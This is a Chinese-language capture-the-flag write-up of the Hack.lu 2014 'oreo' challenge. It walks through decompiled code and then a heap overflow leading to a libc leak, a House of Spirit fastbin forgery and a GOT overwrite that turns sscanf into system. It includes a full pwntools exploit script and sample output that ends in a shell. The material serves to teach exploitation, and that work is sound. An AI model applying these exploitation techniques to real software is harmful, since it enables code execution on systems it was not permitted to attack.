## Hack.lu 2014 - Oreo 中文解析与利用

参考与致敬：本分析主要参考了这篇优秀的文章：[dangokyo 的 writeup](https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/)，并结合本仓库中的反编译代码 `data/sample18.c` 进行核对与补充。

- 题目来源与附件：`https://github.com/guyinatuxedo/ctf/tree/master/hack.lu14/pwn/oreo`
- 思路总览：先利用堆溢出获得 libc 信息泄漏；再使用 House of Spirit 技术在 .bss 中伪造 fastbin chunk 并完成分配；最后覆写 GOT 中的 `scanf` 为 `system`，再传入字符串 `/bin/sh` 以获取 shell。

### 逆向分析

为便于与实际二进制保持一致，下文代码均引用自本仓库的 `data/sample18.c`。

#### Add Rifle（新增步枪）

```15:39:data/sample18.c
unsigned int sub_8048644()
{
  char *v1; // [esp+18h] [ebp-10h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = dword_804A288;
  dword_804A288 = (char *)malloc(0x38u);
  if ( dword_804A288 )
  {
    *((_DWORD *)dword_804A288 + 13) = v1;
    printf("Rifle name: ");
    fgets(dword_804A288 + 25, 56, stdin);
    sub_80485EC(dword_804A288 + 25);
    printf("Rifle description: ");
    fgets(dword_804A288, 56, stdin);
    sub_80485EC(dword_804A288);
    ++dword_804A2A4;
  }
  else
  {
    puts("Something terrible happened!");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

要点：
- `malloc(0x38)` 分配 56 字节的对象；
- 两次 `fgets` 均读取 56 字节，分别写入偏移 `0x19`（名称）与偏移 `0x0`（描述）；
- 对象尾部偏移 `13*4=0x34` 处保存“上一把步枪”的指针（单链表后向指针）。

由此可知，名称写入会溢出并覆盖“上一把”指针，形成可控指针覆写。对象的内存布局可理解为：

```
0x00: 描述（56字节），可溢出覆盖名称
0x19: 名称（56字节），可溢出覆盖上一把指针
0x34: 上一把步枪指针（prev 指针）
```

#### Show Rifles（展示步枪）

```41:55:data/sample18.c
unsigned int sub_8048729()
{
  char *i; // [esp+14h] [ebp-14h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = dword_804A288; i; i = (char *)*((_DWORD *)i + 13) )
  {
    printf("Name: %s\n", i + 25);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return __readgsdword(0x14u) ^ v2;
}
```

要点：遍历链表，依次打印 `i+25`（名称）与 `i`（描述）。如果我们将“上一把指针”覆写为可读内存（如某个 GOT 项地址），就能在下一次打印中将该指针当作字符串指针使用，从而泄漏指针处的数据，达到信息泄漏目的。

#### Order Rifles（下单/释放）

```68:93:data/sample18.c
unsigned int sub_8048810()
{
  char *v1; // [esp+14h] [ebp-14h]
  char *ptr; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  v1 = dword_804A288;
  if ( dword_804A2A4 )
  {
    while ( v1 )
    {
      ptr = v1;
      v1 = (char *)*((_DWORD *)v1 + 13);
      free(ptr);
    }
    dword_804A288 = 0;
    ++dword_804A2A0;
    puts("Okay order submitted!");
  }
  else
  {
    puts("No rifles to be ordered!");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

要点：按链表逐个 `free`，只将 `dword_804A288`（链表头）清零，其余全是悬挂指针场景；为后续 House of Spirit 铺垫。

#### Leave a Message（留言）

```57:66:data/sample18.c
unsigned int sub_80487B4()
{
  unsigned int v1; // [esp+1Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(dword_804A2A8, 128, stdin);
  sub_80485EC(dword_804A2A8);
  return __readgsdword(0x14u) ^ v1;
}
```

要点：向 `dword_804A2A8` 指向的位置写入最多 128 字节，并做一次自定义的去换行/截断处理。结合 .bss 初始化，这个指针最初指向 `.bss` 中的 `message_storage`。

#### Show current status（打印统计）

```111:123:data/sample18.c
unsigned int sub_8048906()
{
  unsigned int v1; // [esp+1Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  puts("======= Status =======");
  printf("New:    %u times\n", dword_804A2A4);
  printf("Orders: %u times\n", dword_804A2A0);
  if ( *dword_804A2A8 )
    printf("Order Message: %s\n", dword_804A2A8);
  puts("======================");
  return __readgsdword(0x14u) ^ v1;
}
```

要点：仅用于查看计数与留言。当 `*message_storage_ptr != 0` 时打印留言。

#### .bss 关键变量与初始化

在 `main` 中可以看到关键全局的初始化：

```164:181:data/sample18.c
int main()
{
  dword_804A2A4 = 0;
  dword_804A2A0 = 0;
  dword_804A2A8 = (char *)&unk_804A2C0;
  puts("Welcome to the OREO Original Rifle Ecommerce Online System!");
  puts(
    "\n"
    "     ,______________________________________\n"
    "    |_________________,----------._ [____]  -,__  __....-----=====\n"
    "                   (_(||||||||||||)___________/                   |\n"
    "                      `----------'   OREO [ ))\"-,                   |\n"
    "                                           \"\"    `,  _,--....___    |\n"
    "                                                   `/           \"\"\"\"\n"
    "\t");
  sub_804898D();
  return 0;
}
```

结合符号名可还原出常用别名：

```
0x0804A288: dword_804A288        // 相当于 new_ptr，指向最后分配的“步枪”
0x0804A2A0: dword_804A2A0        // 相当于 rifles_ordered 统计
0x0804A2A4: dword_804A2A4        // 相当于 new_rifles 统计
0x0804A2A8: dword_804A2A8        // 相当于 message_storage_ptr 指向留言缓冲
0x0804A2C0: unk_804A2C0..        // 相当于 message_storage 数组（大小 0x80）
```

### 利用思路

#### 步骤一：信息泄漏（打破 ASLR）

思路：
- 先 `add` 一个对象，通过名称字段的溢出将“上一把指针”覆写为 `puts@GOT`；
- 执行 `show`，遍历链表时会把“上一把指针”当作字符串打印，因而泄漏出 `puts` 的真实地址；
- 由此减去 `libc` 中 `puts` 的偏移得到 `libc` 基址；再加上 `system` 的偏移得到 `system` 实际地址。

#### 步骤二：House of Spirit（在 .bss 中伪造 fastbin chunk 并分配）

目标：最终令一次分配返回到 `.bss` 的 `message_storage_ptr` 位置，以便能把它覆写为任意地址（例如 `scanf@GOT`）。

要点与选址：
- 伪造两个 fake chunk 的 `size` 字段，分别放在 `.bss` 上可控的位置；
- 第一个 fake chunk 头部选在 `0x804a2a0`（即 `new_rifles` 的地址），其“数据区”从 `0x804a2a8` 开始，恰好是 `message_storage_ptr` 本身，可通过正常逻辑改变其值；
- 第二个 fake chunk 头部选在 `0x804a2e0`，其“数据区”从 `0x804a2e8` 起，落在 `message_storage` 数组内部，这块区域可通过 `leave_message` 任意写；
- 确保两个 fake chunk 的 `size` 满足 fastbin 与 `free` 的一致性校验（典型如对齐、范围、相邻关系等）。

操作步骤（与原文一致）：

```
0) 先通过“添加+释放”循环把 `new_rifles` 累加到 0x40（配合信息泄漏阶段已添加的一把）。
1) 再添加一把，将“上一把指针”覆写为 0x804a2a8（第一个 fake chunk 的数据区首地址），此时 `new_rifles` 递增为 0x41。
2) 用 `leave_message` 在 0x804a2e4 处（第二个 fake chunk 的 size 字段）写入 0x41。
3) 调用下单释放逻辑，`free` 会把 fake chunk 挂入 fastbin。
4) 随后的一次 `malloc` 会从 fastbin 取回这块区域，实现把返回指针“分配”到 `.bss`：我们就能把 0x804a2a8（即 `message_storage_ptr`）覆写为任意地址（如 `scanf@GOT`）。
```

#### 步骤三：覆写 `scanf` 为 `system`

当 `message_storage_ptr` 已被我们写成 `scanf@GOT` 后，再次通过 `leave_message` 向该地址写入 `system` 的实际地址，即完成 GOT 劫持。随后程序在读取菜单动作时会使用 `__isoc99_sscanf` 解析输入，此时就会实际调用到 `system`。我们只需在提示动作时直接输入 `/bin/sh`，即可执行 `system("/bin/sh")` 获得 shell。

### 完整利用脚本（Python/pwntools）

下述脚本与原英文 writeup 保持一致，仅作注释性说明：

```python
# 基于 https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/

from pwn import *

target = process('./oreo', env={"LD_PRELOAD":"/lib32/libc-2.24.so"})
gdb.attach(target)
elf = ELF('oreo')
libc = ELF("/lib32/libc-2.24.so")

def addRifle(name, desc):
    target.sendline('1')
    target.sendline(name)
    target.sendline(desc)

def leakLibc():
    target.sendline('2')
    print target.recvuntil("Description: ")
    print target.recvuntil("Description: ")
    leak = target.recvline()
    puts = u32(leak[0:4])
    libc_base = puts - libc.symbols['puts']
    return libc_base

def orderRifles():
    target.sendline("3")

def leaveMessage(content):
    target.sendline("4")
    target.sendline(content)

# 1) 通过溢出把上一把指针写成 puts@GOT，用于信息泄漏
addRifle('0'*0x1b + p32(elf.got['puts']), "15935728")

# 2) 泄漏 puts、计算 libc 基址与 system 地址
libc_base = leakLibc()
system = libc_base + libc.symbols['system']
log.info("System is: " + hex(system))

# 3) 多次添加+释放以累加 new_rifles，到达 House of Spirit 需要的状态
for i in xrange(0x3f):
    addRifle("1"*0x1b + p32(0x0), "1593")
    orderRifles()

# 4) 将上一把指针改为 0x804a2a8（message_storage_ptr），为 fake chunk 链接做准备
addRifle("1"*0x1b + p32(0x804a2a8), "15935728")

# 5) 用留言把第二个 fake chunk 的 size 写成 0x41
leaveMessage(p32(0)*9 + p32(0x41))

# 6) 释放以把 fake chunk 挂入 fastbin
orderRifles()

# 7) 再次分配，覆写 0x804a2a8（即 message_storage_ptr）为 scanf@GOT
addRifle("15935728", p32(elf.got['__isoc99_sscanf']))

# 8) 把 scanf@GOT 中的函数地址改写为 system
leaveMessage(p32(system))

# 9) 触发：输入 /bin/sh，最终调用 system("/bin/sh")
target.sendline("/bin/sh")
target.interactive()
```

### 运行效果示例

```text
$ python exploit.py

...省略...

$ w
ERROR: ld.so: object '/lib32/libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
 00:54:23 up 14:21,  1 user,  load average: 0.37, 0.44, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               Mon11   13:36m  7:39   0.02s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
ERROR: ld.so: object '/lib32/libc-2.24.so' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.
Add-memo   delete-memo    oreo               readme.md
Edit-memo  exploit.py    peda-session-oreo.txt       solved.py
core       leak.py    peda-session-w.procps.txt
```

到此利用成功获取 shell。

### 小结

- **信息泄漏**：利用“上一把指针”溢出指向 `puts@GOT`，通过 `show` 打印泄漏 libc 地址。
- **House of Spirit**：在 `.bss` 伪造 fastbin chunk，借助释放/分配流程把返回指针“搬到” `.bss` 上可控位置。
- **GOT 劫持**：将 `__isoc99_sscanf@GOT` 改写为 `system`，输入 `/bin/sh` 即得 shell。

参考与原文链接再次附上：[dangokyo 的 writeup](https://dangokyo.me/2017/12/04/hack-lu-ctf-2014-pwn-oreo-write-up/)。


